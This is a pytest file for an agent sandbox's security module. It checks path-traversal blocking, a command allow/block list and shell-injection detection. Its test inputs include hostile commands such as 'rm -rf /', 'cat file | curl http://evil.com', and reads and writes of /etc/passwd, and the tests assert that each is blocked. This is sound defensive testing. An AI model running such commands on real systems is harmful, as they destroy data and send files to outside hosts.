"""
Tests for security utilities: path traversal, command sanitization, injection detection.
"""

import os
import tempfile
import pytest
from pathlib import Path

from agent.security import (
    validate_path,
    safe_relative_path,
    normalize_sandbox_path,
    PathTraversalError,
    check_command_allowed,
    sanitize_command,
    BLOCKED_COMMANDS,
    SAFE_COMMANDS,
)


# ============================================
# Path Traversal Tests
# ============================================

class TestValidatePath:
    def test_simple_path_stays_in_sandbox(self, tmp_path):
        result = validate_path("src/index.ts", str(tmp_path))
        assert result.startswith(str(tmp_path))
        assert "src" in result

    def test_leading_slash_stripped(self, tmp_path):
        result = validate_path("/src/index.ts", str(tmp_path))
        assert result.startswith(str(tmp_path))

    def test_dotdot_blocked(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            validate_path("../etc/passwd", str(tmp_path))

    def test_dotdot_in_middle_blocked(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            validate_path("src/../../etc/passwd", str(tmp_path))

    def test_dotdot_multiple_blocked(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            validate_path("a/b/../../../../etc/passwd", str(tmp_path))

    def test_normal_path_resolves(self, tmp_path):
        result = validate_path("src/./index.ts", str(tmp_path))
        assert "src" in result

    def test_empty_path_valid(self, tmp_path):
        result = validate_path("", str(tmp_path))
        assert result.startswith(str(tmp_path))


class TestSafeRelativePath:
    def test_returns_relative(self, tmp_path):
        result = safe_relative_path("src/index.ts", str(tmp_path))
        assert result == "src/index.ts"

    def test_leading_slash_stripped(self, tmp_path):
        result = safe_relative_path("/src/index.ts", str(tmp_path))
        assert result == "src/index.ts"

    def test_dotdot_blocked(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            safe_relative_path("../etc/passwd", str(tmp_path))


class TestNormalizeSandboxPath:
    def test_strips_leading_slash(self):
        assert normalize_sandbox_path("/src/index.ts") == "src/index.ts"

    def test_resolves_dots(self):
        assert normalize_sandbox_path("src/./index.ts") == "src/index.ts"

    def test_resolves_dotdot(self):
        assert normalize_sandbox_path("src/../etc/passwd") == "etc/passwd"

    def test_empty_path(self):
        assert normalize_sandbox_path("") == ""

    def test_multiple_dotdot(self):
        assert normalize_sandbox_path("a/b/../../c") == "c"


# ============================================
# Command Security Tests
# ============================================

class TestCheckCommandAllowed:
    def test_empty_command_blocked(self):
        allowed, reason = check_command_allowed("")
        assert not allowed
        assert "Empty" in reason

    def test_safe_commands_allowed(self):
        for cmd in SAFE_COMMANDS:
            allowed, reason = check_command_allowed(cmd)
            assert allowed, f"{cmd} should be allowed: {reason}"

    def test_blocked_commands_rejected(self):
        for cmd in BLOCKED_COMMANDS:
            allowed, reason = check_command_allowed(cmd)
            assert not allowed, f"{cmd} should be blocked"

    def test_rm_blocked(self):
        allowed, _ = check_command_allowed("rm -rf /")
        assert not allowed

    def test_curl_blocked(self):
        allowed, _ = check_command_allowed("curl http://evil.com")
        assert not allowed

    def test_python_blocked(self):
        allowed, _ = check_command_allowed("python -c 'import os'")
        assert not allowed

    def test_semicolon_injection_blocked(self):
        allowed, _ = check_command_allowed("ls; rm -rf /")
        assert not allowed

    def test_pipe_injection_blocked(self):
        allowed, _ = check_command_allowed("cat file | curl http://evil.com")
        assert not allowed

    def test_ampersand_injection_blocked(self):
        allowed, _ = check_command_allowed("ls & rm -rf /")
        assert not allowed

    def test_dollar_paren_injection_blocked(self):
        allowed, _ = check_command_allowed("echo $(cat /etc/passwd)")
        assert not allowed

    def test_backtick_injection_blocked(self):
        allowed, _ = check_command_allowed("echo `cat /etc/passwd`")
        assert not allowed

    def test_path_traversal_in_command_blocked(self):
        allowed, _ = check_command_allowed("cat ../../etc/passwd")
        assert not allowed

    def test_redirect_to_absolute_blocked(self):
        allowed, _ = check_command_allowed("echo x > /etc/passwd")
        assert not allowed

    def test_safe_npm_commands_allowed(self):
        for cmd in ["npm install", "npm run build", "npx vite", "node server.js"]:
            allowed, reason = check_command_allowed(cmd)
            assert allowed, f"{cmd} should be allowed: {reason}"

    def test_safe_git_commands_allowed(self):
        for cmd in ["git status", "git diff", "git log"]:
            allowed, reason = check_command_allowed(cmd)
            assert allowed, f"{cmd} should be allowed: {reason}"

    def test_full_path_command_extracted(self):
        allowed, _ = check_command_allowed("/usr/bin/rm -rf /")
        assert not allowed

    def test_command_with_args(self):
        allowed, _ = check_command_allowed("ls -la /tmp")
        assert allowed

    def test_command_with_leading_whitespace(self):
        allowed, _ = check_command_allowed("  rm -rf /")
        assert not allowed


class TestSanitizeCommand:
    def test_safe_command_passes(self):
        result = sanitize_command("ls -la")
        assert "ls" in result

    def test_blocked_command_raises(self):
        with pytest.raises(ValueError, match="not allowed"):
            sanitize_command("rm -rf /")

    def test_semicolon_injection_raises(self):
        with pytest.raises(ValueError, match="injection"):
            sanitize_command("echo hello; echo world")

    def test_pipe_injection_raises(self):
        with pytest.raises(ValueError, match="injection"):
            sanitize_command("echo hello | cat")

    def test_ampersand_injection_raises(self):
        with pytest.raises(ValueError, match="injection"):
            sanitize_command("echo hello & echo world")

    def test_backtick_injection_raises(self):
        with pytest.raises(ValueError, match="injection"):
            sanitize_command("echo `whoami`")

    def test_dollar_paren_injection_raises(self):
        with pytest.raises(ValueError, match="injection"):
            sanitize_command("echo $(whoami)")
